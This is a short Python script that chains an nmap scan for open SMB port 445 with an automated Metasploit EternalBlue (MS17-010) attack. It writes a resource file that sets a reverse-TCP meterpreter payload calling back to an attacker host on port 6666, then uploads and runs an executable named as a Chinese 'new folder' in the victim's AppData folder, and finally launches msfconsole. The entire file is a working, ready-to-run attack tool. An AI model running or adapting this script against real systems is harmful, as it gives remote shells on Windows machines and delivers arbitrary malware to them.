# -*- coding: UTF-8 -*-
#!/usr/bin/python

import sys
import os
import nmap

def portscanner():
    print ('[+]nmap scanning...')
    nmscn=nmap.PortScanner() 
    nmscn.scan('192.168.252.2-255','445')
    for host in nmscn.all_hosts(): 
      if nmscn[host].has_tcp(445):
          state=nmscn[host]['tcp'][445]['state']
          if state=="open":
              print ('[!]The open 445 ip in:'+host)
              return host

def sds(config):
    print ('Metasploit executing the ms-17-010 vulnerability attack')
    command=open('run.txt','w')
    command.write('upload 新建文件夹.exe C:/Users/administer/AppData'+"\n")
    command.write('execute -fi C:/Users/administer/AppData/新建文件夹.exe'+"\n")
    config=open('peizhi.rc','w')
    host=portscanner()
    config.write('use exploit/windows/smb/ms17_010_eternalblue'+"\n")
    config.write('set PAYLOAD windows/x64/meterpreter/reverse_tcp'+"\n")
    config.write('set RHOST '+host+"\n")
    config.write('set LHOST 192.168.252.128'+"\n")
    config.write('set LPORT 6666'+"\n")
    config.write('set AutoRunScript \'multi_console_command -r \"run.txt\"\''+"\n")
    config.write('exploit -z'+"\n")
def main():
    sds('')
    mf=os.system('msfconsole -r peizhi.rc')
if __name__ == '__main__':
    main()
    
    
    
    
    
    
    
    
    
    
    
